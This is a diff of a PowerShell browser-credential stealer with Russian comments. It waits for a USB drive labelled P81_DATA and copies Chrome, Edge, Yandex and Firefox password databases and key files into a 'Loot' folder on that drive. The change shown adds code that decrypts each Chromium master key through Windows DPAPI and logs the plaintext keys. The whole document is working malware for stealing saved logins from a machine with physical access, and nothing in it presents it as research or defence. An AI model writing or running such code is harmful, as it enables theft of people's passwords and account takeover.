@@ -1,12 +1,15 @@
-# 1. Поиск флешки P81_DATA
+# 1. Поиск флешки
 $u = Get-Volume | Where-Object { $_.FileSystemLabel -eq 'P81_DATA' } | Select-Object -ExpandProperty DriveLetter
 if (!$u) { exit }
 
-# 2. Папка назначения
+# 2. Папка для сбора
 $d = "$($u):\Loot\$(Get-Date -Format 'HH_mm_ss')"
 New-Item -ItemType Directory -Path $d -Force | Out-Null
+$log = "$d\DECRYPTED_KEYS.log"
 
-# 3. Сбор Chromium (Chrome, Edge, Yandex)
+# Подгружаем системную библиотеку для дешифровки
+Add-Type -AssemblyName System.Security
+
 $bList = @(
     @{n="CHROME"; p="Google\Chrome\User Data"},
     @{n="EDGE"; p="Microsoft\Edge\User Data"},
@@ -17,32 +20,43 @@ foreach ($b in $bList) {
     $p = Join-Path $env:LOCALAPPDATA $b.p
     if (Test-Path $p) {
         $prefix = $b.n
-        
-        # КЛЮЧИ: Копируем Local State и сразу делаем текстовую копию .txt
         $ls = Join-Path $p "Local State"
+        
         if (Test-Path $ls) {
-            Copy-Item $ls -Destination "$d\$($prefix)_LocalState_ORIGINAL" -Force
-            # Создаем текстовый дубликат, который легко прочитать
-            cmd /c copy /y "$ls" "$d\$($prefix)_KEY_READ_ME.txt"
+            try {
+                # Читаем JSON и достаем зашифрованный ключ
+                $json = Get-Content $ls -Raw | ConvertFrom-Json
+                $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
+                
+                # Убираем префикс 'DPAPI' (первые 5 байт) и дешифруем через текущего пользователя
+                $finalKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length-1)], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+                $base64MasterKey = [Convert]::ToBase64String($finalKey)
+                
+                # Записываем готовый результат в лог
+                "[$prefix] Decrypted Master Key: $base64MasterKey" | Out-File -FilePath $log -Append -Encoding UTF8
+                
+                # Копируем и сам файл на всякий случай
+                copy-item $ls -Destination "$d\$($prefix)_LocalState" -Force
+            } catch {
+                "[$prefix] Key decryption failed: $($_.Exception.Message)" | Out-File -FilePath $log -Append
+            }
         }
         
-        # ПАРОЛИ: Поиск и копирование баз
+        # Копируем базы паролей
         Get-ChildItem -Path $p -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
             $prof = $_.Directory.Name
-            $target = "$d\$($prefix)_$($prof)_LoginData.db"
-            cmd /c copy /y "$($_.FullName)" "$target"
+            copy-item $_.FullName -Destination "$d\$($prefix)_$($prof)_LoginData.db" -Force -ErrorAction SilentlyContinue
         }
     }
 }
 
-# 4. Сбор Firefox
+# 3. Firefox (ключи дешифруются только на твоем компе через профиль)
 $ff = "$env:APPDATA\Mozilla\Firefox\Profiles"
 if (Test-Path $ff) {
     Get-ChildItem -Path $ff -Directory | ForEach-Object {
         $src = $_.FullName
-        $name = $_.Name
-        cmd /c copy /y "$src\logins.json" "$d\FF_$($name)_logins.json"
-        cmd /c copy /y "$src\key4.db" "$d\FF_$($name)_key4.db"
+        copy-item "$src\logins.json" "$d\FF_$($_.Name)_logins.json" -ErrorAction SilentlyContinue
+        copy-item "$src\key4.db" "$d\FF_$($_.Name)_key4.db" -ErrorAction SilentlyContinue
     }
 }
 
